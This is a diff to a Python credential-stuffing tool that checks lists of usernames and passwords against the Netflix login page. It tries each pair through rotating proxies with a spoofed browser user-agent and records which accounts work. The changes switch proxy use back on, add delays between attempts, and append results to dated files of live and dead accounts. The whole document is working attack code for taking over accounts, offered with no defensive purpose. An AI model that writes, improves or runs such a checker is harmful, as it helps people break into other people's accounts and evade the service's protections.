@@ -8,6 +8,7 @@ import os
 import mechanize
 import json
 import requests
+import time
 import random
 import threading
 import multiprocessing
@@ -83,9 +84,8 @@ def save_account(data: tuple, accounts_state: AccountState) -> None:
     global COMMON_FILE_CONVENTION
     data_type = "working_accounts" if accounts_state == accounts_state.LIVE else "notworking_accounts"
     file_name = datetime.now().strftime("%d-%m-%Y")
-    with open(f'./{data_type}/' + file_name + COMMON_FILE_CONVENTION, "w+") as file_stream:
-        for bite in data:
-            file_stream.write(bite)
+    with open(f'./{data_type}/' + file_name + COMMON_FILE_CONVENTION, "a+") as file_stream:
+        file_stream.write(f'{str(data).replace("(", "").replace(")", "")} \n')
         file_stream.close()
 
 def transform(stream: TextIOWrapper, file_type: FileType)   -> list[tuple]:
@@ -150,7 +150,7 @@ def check_account(account: tuple, proxy: dict) -> bool:
     br.set_handle_referer(True)
     br.set_handle_robots(False)
     br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'), ('Content-Type','application/json')]
-    #br.set_proxies(proxies=proxy)
+    br.set_proxies(proxies=proxy)
 
     br.open('https://www.netflix.com/co-en/login')
     br.select_form(nr=0)
@@ -164,12 +164,12 @@ def check_account(account: tuple, proxy: dict) -> bool:
     if response.geturl() == "https://www.netflix.com/browse":
         print(Fore.YELLOW, f'   Account working: {account}')
         save_account(data=account, accounts_state=AccountState.LIVE)
-        print(Fore.WHITE, "   ========================================================")
+        time.sleep(2)
         return True
     else:
         print(Fore.RED, f'   Account die: {account}')
         save_account(data=account, accounts_state=AccountState.DIE)
-        print(Fore.WHITE, "   ========================================================")
+        time.sleep(2)
         return False
 
 def check_accounts(accounts: list[tuple], proxies: list[tuple]) -> None:
@@ -179,22 +179,24 @@ def check_accounts(accounts: list[tuple], proxies: list[tuple]) -> None:
     for account in purgued_accounts:
         proxy = generate_request_proxy(proxies=proxies)
         check_account(account=account, proxy=proxy)
+    print(Fore.WHITE, "   ========================================================")
         
 def setup() -> None:
     global MALFORMED_ACCOUNTS_FOLDER
     global MALFORMED_PROXIES_FOLDER
     global NOTWORKING_ACCOUNTS_FOLDER
     global WORKING_ACCOUNTS_FOLDER
-    print(Fore.WHITE, "Starting setup")
+    print(Fore.WHITE, "   Starting setup ===========================>")
     if not os.path.exists(f'./{MALFORMED_ACCOUNTS_FOLDER}'): os.makedirs(MALFORMED_ACCOUNTS_FOLDER)
     if not os.path.exists(f'./{MALFORMED_PROXIES_FOLDER}'): os.makedirs(MALFORMED_PROXIES_FOLDER)
     if not os.path.exists(f'./{NOTWORKING_ACCOUNTS_FOLDER}'): os.makedirs(NOTWORKING_ACCOUNTS_FOLDER)
     if not os.path.exists(f'./{WORKING_ACCOUNTS_FOLDER}'): os.makedirs(WORKING_ACCOUNTS_FOLDER)
-    print(Fore.GREEN, "Setup done \n")
+    print(Fore.GREEN, "    Setup done ===========================> \n")
 
 
 def start() -> None:
     welcome()
+    setup()
     print(Fore.WHITE)
     file_accounts_name = str(input("    Do u have a custom accounts list? Enter the name or leave empty: "))
     accounts: list[tuple] = load_file_as_tuple(FileType.ACCOUNTS, file_accounts_name if len(file_accounts_name) > 0 else None)
